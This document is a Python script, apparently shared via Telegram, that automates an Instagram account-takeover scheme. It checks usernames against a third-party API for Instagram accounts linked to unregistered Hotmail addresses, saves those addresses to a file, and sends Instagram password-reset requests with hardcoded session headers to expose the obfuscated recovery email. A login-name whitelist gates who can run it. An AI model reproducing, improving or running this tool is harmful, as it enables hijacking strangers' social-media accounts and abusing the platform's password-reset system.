import os
try:
    import requests
    import uuid
except ImportError as error:
    os.system('pip install requests')
    os.system('pip install uuid')
    os.system('clear')

import requests 
import time
import os
import json
import sys
import uuid 

ru =["u-0-_-a-2-5-9"]
#uuid = str(os.geteuid()) + str(os.getlogin())
uuid =str(os.getlogin())
id = "-".join(uuid)
print(f"ID : {id}")
if id in ru : 
    print(f'Acctive .... : {id}')
    time.sleep(2)
    os.system("clear")

else:
    os.system('clear')
    print(f'The ID No Acctive : {id} - Telegram @BBMZZ - @Zaidkarrem')
    sys.exit()

a=0
s=0
u=0
r=0
m=0
fil = input("[-] - Enter Your File Me : ")
try:

    o = open(fil,'r').read().splitlines()
except FileNotFoundError as error:
    print(f"File Error ! Nme : {fil}")
    exit()
for ra in o:
    url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{ra}').text
    if ('"OK"') in url:
        url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{ra}').json()['status']
        if url2=='ok':
            with open(f'acctive.txt','a') as f0:
                f0.write(f'{ra}@hotmail.com\n')
            url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(ra)
            head2={
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                'viewport-width': '917',
                'x-asbd-id': '198387',
                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                'x-instagram-ajax': '1006627630',
                'x-requested-with': 'XMLHttpRequest'
            }
            try:
                ge = requests.get(url2,headers=head2).json()
                id = ge['data']['user']['id']
                headers1 = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                    }
                data3 = {
                    'ig_sig_key_version': '4',
                    "user_id":id
                }
                try:
                    res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                    try:
                        rs =str(res['obfuscated_email'])
                        print(f"Email | {ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                    except KeyError as error:
                        print('error')
                except requests.exceptions.ConnectionError as error:
                    continue
            except requests.exceptions.ConnectionError as error:
                continue
            a+=1
            os.system('cls' if os.name=='nt'else"clear")
            print(f'Ok | {a} | H.B | {s} | B.I | {u} | Telegram | {r} |')
        else:
            s+=1
            os.system('cls' if os.name=='nt'else"clear")
            print(f'Ok | {a} | H.B | {s} | B.I | {u} | Telegram | {r} |')
    else:
        u+=1
        os.system('cls' if os.name=='nt'else"clear")
        print(f'Ok | {a} | H.B | {s} | B.I | {u} | Telegram | {r} |')



